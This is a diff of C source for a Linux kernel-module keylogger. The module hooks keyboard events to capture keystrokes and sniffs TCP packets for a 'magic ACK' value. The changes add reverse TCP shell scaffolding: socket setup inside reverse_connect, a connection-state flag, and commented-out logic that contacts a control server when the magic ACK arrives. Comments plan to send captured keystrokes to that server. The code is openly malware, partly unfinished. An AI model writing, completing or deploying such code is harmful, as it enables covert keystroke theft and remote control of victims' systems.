@@ -35,7 +35,11 @@
 #define SHIFT_ENABLED  1				/* Shift key is enabled.  */
 #define SHIFT_DISABLED 0				/* Shift key is disabled. */
 
+#define CONNECTED      1				/* r-TCP connection established.     */
+#define DISCONNECTED   0				/* r-TCP connection not established. */
+
 mm_segment_t oldfs;
+
 
 /**
  * KEYLOGGER FUNCTIONALITY
@@ -55,6 +59,11 @@ struct socket      *sock;
 
 
 /**
+ * REVERSE TCP SHELL FUNCTIONALITY
+**/
+int connection_state;
+
+/**
  * Correlates with the key definitions found in:
  * /usr/include/linux/input.h
 **/
@@ -69,6 +78,7 @@ char *letters[] =
 	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
 	"0", "."
 };
+
 
 /**
  * Can be used for uppercase lettering. In other words:
@@ -85,6 +95,7 @@ char *shift_letters[] =
 	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
 	"0", "."
 };
+
 
 /**
  * TODO: 
@@ -138,12 +149,17 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 				 * TODO:
 				 *   + Send keyboard buffer to control server. 
 				**/
-				// CUrrently flushes the keyboard buffer.
+				// Currently flushes the keyboard buffer.
 				else
 				{
 					memset(&keyboard_buffer, '0', KEYBOARD_BUFFER_SIZE);
 					keyboard_index = 0;
 					buffer[keyboard_index++] = c;
+
+					/**
+					if (connection_state)
+						// send buffer to control server
+					**/
 				}
 			}
 		}
@@ -152,15 +168,33 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 	return NOTIFY_OK;
 }
 
+
 static struct notifier_block nb =
 {
 	.notifier_call = notification
 };
 
 
-void reverse_connect(void)
+void reverse_connect(unsigned long int ack_seq)
 {
-	/* Use after receiving the "magic" ACK number. */
+	// unsigned long  int server_ip;
+	// unsigned short int server_port;
+
+	printk("Initializing network socket.\n");
+	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
+	{
+		printk("Error in creating socket.\n");
+	}
+
+	/**
+	 * server_ip and server_port are undefined.
+	 * Use ack_seq to enumerate both a server and port.
+	**/
+	memset(&sock_in, 0, sizeof(sock_in));
+	//sock_in.sin_addr.s_addr = htonl(server_ip);
+	sock_in.sin_family = AF_INET;
+	//sock_in.sin_port = htons(server_port);
+
 	/**
 	printk("Attempting to connect to server [expected not to].\n");
 	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
@@ -194,9 +228,11 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 		printk("seq:     %lu\n", seq);
 
 		/* Use after magic 'ACK' was received. Decide on magic 'ACK'. */
+		/* Server IP and Port could be enumerated from"magic ACK".    */
+		/* Could have numerous magic ACK's in a magic list!			  */
 		/**
-		if (ack_seq == [MAGIC_ACK])
-			reverse_connect();
+		if (ack_seq == [MAGIC_ACK_IN_LIST] && !connection_state)
+			reverse_connect(ack_seq);
 		**/
 	}
 
@@ -205,11 +241,6 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 }
 
 
-/**
- * TODO:
- *   - Add network-listening functionality.
- *   - Filter out "ACK" numbers from TCP packets.
-**/
 int start_listen(void *args)
 {
 	printk("Starting network sniffing.\n");
@@ -242,27 +273,14 @@ int start(void)
 	register_keyboard_notifier(&nb);
 	keyboard_index = 0;
 
-	printk("Initializing network socket.\n");
-	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
-	{
-		printk("Error in creating socket.\n");
-		return 1;
-	}
-
-	/**
-	 * server_ip and server_port are undefined.
-	**/
-	memset(&sock_in, 0, sizeof(sock_in));
-	//sock_in.sin_addr.s_addr = htonl(server_ip);
-	sock_in.sin_family = AF_INET;
-	//sock_in.sin_port = htons(server_port);
-
 	printk("Starting network-listening thread.\n");
 	net_thread = kthread_create(start_listen, NULL, "network_listener");
 	wake_up_process(net_thread);
+	connection_state = DISCONNECTED;
 
 	return 0;
 }
+
 
 void stop(void)
 {
